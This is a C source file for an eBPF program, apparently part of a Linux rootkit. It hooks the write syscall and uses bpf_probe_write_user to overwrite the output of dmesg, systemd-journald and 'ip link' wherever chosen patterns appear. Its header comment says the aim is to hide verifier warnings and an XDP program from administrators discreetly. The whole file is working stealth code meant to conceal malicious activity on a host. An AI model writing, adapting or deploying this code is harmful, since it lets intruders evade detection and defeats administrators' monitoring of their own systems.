//go:build ignore

/*  The goal here is to create a eBPF program that hides specific log messages from the 
    output of command like dmesg.

    Most eBPF verifiers will emit a warning message in the kernel printk buffer when they detect usage 
    of the bpf_probe_write_user() function. This warning will likely appear multiple times in the output of dmesg. 
    While you can clear the buffer with dmesg -C, this will also erase all legitimate logs, which is not very 
    discreet for hiding activity. Additionally, on some distributions, the printk console level is set to 4 (warning),
    so the message may appear directly on the consoles of connected users. You can check the current level with
    cat /proc/sys/kernel/printk and, if needed, temporarily or permanently change the values using sysctl to reduce
    the visibility of these warnings.

    It is important to understand that this program only modifies the output from dmesg; the logs 
    themselves are still written and present in the kernel printk buffer.
    Note that systemd-journald continuously reads from /dev/kmsg and will log every line that appears 
    there, using mechanisms like epoll wait. As a result all kernel messages—including warnings from eBPF 
    verifiers will still be recorded by journald and available in the system logs.

    This time, we will use a different technique to prevent journald from writing this warning 
    and other logs, according to criteria that we will define.
    We will achieve this using another eBPF program.

    We also use this technique to hide the presence of the XDP program from the output of the ip link command.
*/

#include "vmlinux.h"
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "hide_write.h"

SEC("kprobe/__x64_sys_write")
int BPF_KPROBE(trace_write)
{
    struct pt_regs *real_regs = PT_REGS_SYSCALL_REGS(ctx);

    u32 uid = (u32)bpf_get_current_uid_gid();
    
    char comm[TASK_COMM_LEN] = {};
    bpf_get_current_comm(&comm, sizeof(comm));
    
    int found_command = 0;
    for (int c = 0; c < MAX_COMMANDS; c++) {
        if (__builtin_strncmp(comm, commands[c].command, commands[c].len) == 0) {
            found_command = 1;
            break;
        }
    }
    
    if (!found_command) {
        return 0;
    }

    const char *buf = (const char *)PT_REGS_PARM2_CORE_SYSCALL(real_regs);
    u64 count = PT_REGS_PARM3_CORE_SYSCALL(real_regs);

    if (count <= 0 || buf == NULL)
        return 0;
    count = count > MAX_BUF ? MAX_BUF : count;

    char data[MAX_BUF] = {};
    if (bpf_core_read_user_str(&data, count, buf) < 0)
        return 0;

    u32 key = PATCH_KEY;
    char *patch = bpf_map_lookup_elem(&patch_map, &key);
    if (!patch)
        return 0;

    for (int p = 0; p < MAX_PATTERNS; p++) {
        if (patterns[p].len == 0)
        continue;
        int limit = count > patterns[p].len ? count - patterns[p].len : 0;
        for (int i = 0; i < limit; i++) {
            if (__builtin_memcmp(&data[i], patterns[p].pattern, patterns[p].len) == 0) {
                bpf_probe_write_user((void *)buf, patch, count);
                return 0;
            }
        }
    }

    return 0;
}
char LICENSE[] SEC("license") = "GPL";